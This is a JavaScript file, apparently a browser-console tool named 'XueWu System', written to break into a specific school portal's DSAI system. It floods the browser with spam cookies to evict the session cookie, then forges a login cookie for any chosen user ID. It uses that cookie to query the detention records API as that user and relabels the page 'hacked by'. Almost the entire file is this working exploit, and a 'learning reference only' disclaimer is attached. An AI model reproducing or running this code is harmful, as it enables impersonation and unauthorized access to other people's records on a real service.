/* XueWu System Core Javascript
 * (C)opyright 2024 KCISHackers.
 * All Rights reserved.
 * Visit: https://www.github.com/KCISHacker/XueWuSystem for more info.
 */
/*
 * Debug log. Set 'hacker_debug' to true to enable
 */
var hacker_debug=true;
function log(info){
    hacker_debug&&console.log(info);
}
/* Tweaking function. Should be used in portal.kciesc.com
 * Redirect to /DSAI/Home to validate the tweak after running.
 */
function hack(id){
    log("Hacking "+id);
    var date=new Date();
    date.setTime(date.getTime()+3600000);
    /*Delete all cookies(uses overflow to delete httpOnly cookies)*/
    log("Attacking session cookie");
    for(let i=0;i<100;i++)
        log("Creating spam cookie: "+(document.cookie='cookie'+i+'='+i+';expires='+date.toUTCString()));
    var oldest_time=new Date(0);
    /*Delete spam cookies after attack*/
    for(let i=0;i<100;i++)
        document.cookie='cookie'+i+'=0;expires='+oldest_time.toUTCString();
    log('Spam cookies are been deleted');
    /*Create fake login cookie*/
    document.cookie="DSAI="+id+";expires="+date.toGMTString()+";path=/";
    /*Get hacked session*/
    log("Detention API returned:");
    fetch(window.location.origin+'/DSAI/Query/Form_ListDetention?strKeyWord1=')
    .then(response=>response.json()).then(data=>log(data))
    .catch(error=>(function(){
        console.error(error);
        if(error.name=='SyntaxError'){
            alert(id+' seems not exist. Check your spelling.');
            return;
        }
        alert("Error while hacking "+id+"! "+error);successed=false;
    }()))
}
/* Visual interface (Tweaking DOM of portal.kcisec.com/DSAI/Home) */

function core(){
    console.log("Hello from XueWuSystem: Ciallo～(∠・ω< )⌒★")
    if(document.getElementById("hacked")){
        alert('This page had already been hacked! Do not run twice!');
    }
    /*Details*/
    document.getElementsByClassName("main_logout")[0].innerText="hacked by 学武系统hacker";
    document.getElementsByClassName("ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset")[1].
    innerHTML="<div style=\"color:red\">This program is for learning reference only, rather than abusing, or you'll take the risk!</div>";
    document.getElementById("UserId").addEventListener("keyup",function(event){
        if(event.keyCode===13){
            event.preventDefault();
            btn_onclick();
        }
    });
    /*Override event of submit button*/
    document.getElementsByName('btn_s')[0].removeEventListener("click", function(){});
    function btn_onclick(){
        if(document.getElementById("UserId").value==''){
            alert('Username field cannot be empty!');
            return;
        }
        hack(document.getElementById("UserId").value);
        log("done hacking, redirecting to /DSAI/Home");
        window.location.href="/DSAI/Home";
    }
    document.getElementsByName('btn_s')[0].addEventListener("click",btn_onclick);
    document.body.innerHTML += '<div id="hacked"></div>';
}